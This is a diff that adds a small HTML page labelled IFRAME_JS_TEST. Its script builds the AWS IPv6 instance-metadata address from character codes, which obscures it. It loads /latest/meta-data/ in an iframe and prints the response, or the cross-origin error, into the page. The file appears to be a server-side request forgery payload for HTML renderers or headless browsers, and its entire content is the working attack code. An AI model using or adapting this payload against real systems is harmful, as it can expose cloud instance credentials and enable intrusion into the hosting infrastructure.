@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html><body>
+<h1>IFRAME_JS_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+var proto = String.fromCharCode(104,116,116,112);
+var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);
+var iframe = document.createElement('iframe');
+iframe.src = proto + '://[' + ip + ']/latest/meta-data/';
+iframe.width = '100%';
+iframe.height = '500';
+iframe.onload = function() {
+  try {
+    var content = iframe.contentDocument.body.innerText;
+    document.getElementById('r1').innerText = 'IFRAME_CONTENT:' + content;
+  } catch(e) {
+    document.getElementById('r1').innerText = 'IFRAME_CROSS_ORIGIN:' + e.message;
+  }
+};
+document.body.appendChild(iframe);
+</script>
+</body></html>
